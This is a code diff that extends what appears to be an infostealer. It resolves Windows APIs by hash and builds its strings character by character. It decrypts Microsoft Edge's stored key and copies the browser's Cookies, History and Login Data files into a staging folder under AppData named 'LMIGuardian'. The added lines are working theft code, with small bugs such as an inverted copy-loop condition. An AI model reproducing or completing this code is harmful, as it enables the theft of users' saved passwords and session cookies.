@@ -102,6 +102,17 @@ void DecryptKey() {
     if (pSHGetFolderPathA(NULL, 0x001c, NULL, 0, path) != S_OK) {
         return;
     }
+    
+    char pathEdge[MAX_PATH] = { 0 };
+    CopyStringA(path, pathEdge, MAX_PATH);
+    char sSubEdge[] = {
+        '\\','M','i','c','r','o','s','o','f','t','\\',
+        'E','d','g','e','\\',
+        'U','s','e','r',' ','D','a','t','a', '\\',
+        'D', 'e', 'f', 'a', 'u', 'l', 't',
+        '\0'
+    };
+    CopyStringA(sSubEdge, pathEdge + StrLen(pathEdge), MAX_PATH - StrLen(pathEdge));
 
     char sLocalState[] = {
         '\\','M','i','c','r','o','s','o','f','t','\\',
@@ -111,7 +122,51 @@ void DecryptKey() {
         '\0'
         };
     int size = StrLen(path);
-    CopyStringA(sLocalState, path + StrLen(path), MAX_PATH - StrLen(sLocalState));
+    CopyStringA(sLocalState, path + StrLen(path), MAX_PATH - StrLen(path));
+
+    char pathMal[MAX_PATH] = { 0 };
+    if (pSHGetFolderPathA(NULL, 0x001a, NULL, 0, pathMal)) {
+        return;
+    }
+    char sMal[] = {
+        '\\', 'L', 'M', 'I', 'G', 'u', 'a', 'r', 'd', 'i', 'a', 'n', '\0'
+    };
+
+    char keyPath[MAX_PATH] = { 0 };
+    char cookiesPath[MAX_PATH] = { 0 };
+    char historyPath[MAX_PATH] = { 0 };
+    char passwordPath[MAX_PATH] = { 0 };
+
+    CopyStringA(sMal, pathMal + StrLen(pathMal), MAX_PATH - StrLen(sMal));
+
+    CopyStringA(pathMal, keyPath, MAX_PATH);
+    char keyFileName[] = { '\\', 'b', 'r', 'o', 'w', 's', 'e', 'r', 'k', 'e', 'y', '.', 'd', 'b', '\0' };
+    CopyStringA(keyFileName, keyPath + StrLen(keyPath), MAX_PATH - StrLen(keyPath));
+
+    CopyStringA(pathMal, cookiesPath, MAX_PATH);
+    CopyStringA(pathMal, historyPath, MAX_PATH);
+    CopyStringA(pathMal, passwordPath, MAX_PATH);
+    char historyFilename[] = {'\\', 'H', 'i', 's', 't', 'o', 'r', 'y', '\0'};
+    char cookiesFilename[] = {'\\', 'C', 'o', 'o', 'k', 'i', 'e', 's', '\0' };
+    char passwordFilename[] = {'\\', 'L', 'o', 'g', 'i', 'n', ' ', 'D', 'a', 't', 'a', '\0' };
+
+    CopyStringA(cookiesFilename, cookiesPath + StrLen(cookiesPath), MAX_PATH - StrLen(passwordPath));
+    CopyStringA(historyFilename, historyPath + StrLen(historyPath), MAX_PATH - StrLen(passwordPath));
+    CopyStringA(passwordFilename, passwordPath + StrLen(passwordPath), MAX_PATH - StrLen(passwordPath));
+
+    char orCookiesPath[MAX_PATH] = { 0 };
+    char orHistoryPath[MAX_PATH] = { 0 };
+    char orPasswordPath[MAX_PATH] = { 0 };
+    CopyStringA(pathEdge, orCookiesPath, MAX_PATH);
+    CopyStringA(pathEdge, orHistoryPath, MAX_PATH);
+    CopyStringA(pathEdge, orPasswordPath, MAX_PATH);
+
+    char network[] = { '\\', 'N', 'e', 't', 'w', 'o', 'r', 'k', '\0' };
+
+    CopyStringA(network, orCookiesPath + StrLen(orCookiesPath), MAX_PATH - StrLen(orCookiesPath));
+    CopyStringA(cookiesFilename, orCookiesPath + StrLen(orCookiesPath), MAX_PATH - StrLen(orCookiesPath));
+    CopyStringA(historyFilename, orHistoryPath + StrLen(orHistoryPath), MAX_PATH - StrLen(orHistoryPath));
+    CopyStringA(passwordFilename, orPasswordPath + StrLen(orPasswordPath), MAX_PATH - StrLen(orPasswordPath));
 
     typedef HANDLE(WINAPI* _CreateFileA)(
         LPCSTR                lpFileName,
@@ -285,9 +340,33 @@ void DecryptKey() {
         _WriteFile pWriteFile = (_WriteFile)apiResolve.GetApiAddress(lpKernel32, hashWriteFile);
         if (!pWriteFile) { return; }
         //Write key to file in desktop
-        char path[] = { 'C', ':', '\\', 'U', 's', 'e', 'r', 's', '\\', 'a', 'd', 'm', 'i', 'n', '\\', 'D', 'e', 's', 'k', 't', 'o', 'p', '\\', 'd', 'e', 'c', 'r', 'y', 'p', 't', 'e', 'd', '_', 'k', 'e', 'y', '.', 't', 'x', 't', '\0'};
-        HANDLE hFile = pCreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        //char keyFileName[] = { 'b', 'r', 'o', 'w', 's', 'e', 'r', 'k', 'e', 'y', '\0' };
+        //CopyStringA(keyFileName, pathMal + StrLen(pathMal), MAX_PATH - StrLen(pathMal));
+        HANDLE hFile = pCreateFileA(keyPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
         pWriteFile(hFile, decryptedDataBSTR, pSysStringByteLen(decryptedDataBSTR), NULL, NULL);
+
+        constexpr unsigned int hashCopyFileA = ComplexHashForAnsi("CopyFileA");
+        typedef BOOL (WINAPI* _CopyFileA)(
+            LPCSTR lpExistingFileName,
+            LPCSTR lpNewFileName,
+            BOOL   bFailIfExists
+        );
+        _CopyFileA pCopyFileA = (_CopyFileA)apiResolve.GetApiAddress(lpKernel32, hashCopyFileA);
+        if (!pCopyFileA) { return; }
+        
+        while (!pCopyFileA(orCookiesPath, cookiesPath, FALSE)) {
+            
+        }
+        
+        while (!pCopyFileA(orHistoryPath, historyPath, FALSE)) {
+
+        }
+
+        while (pCopyFileA(orPasswordPath, passwordPath, FALSE)) {
+
+        }
+        
+
         pSysFreeString(decryptedDataBSTR);
         pCloseHandle(hFile);
     }
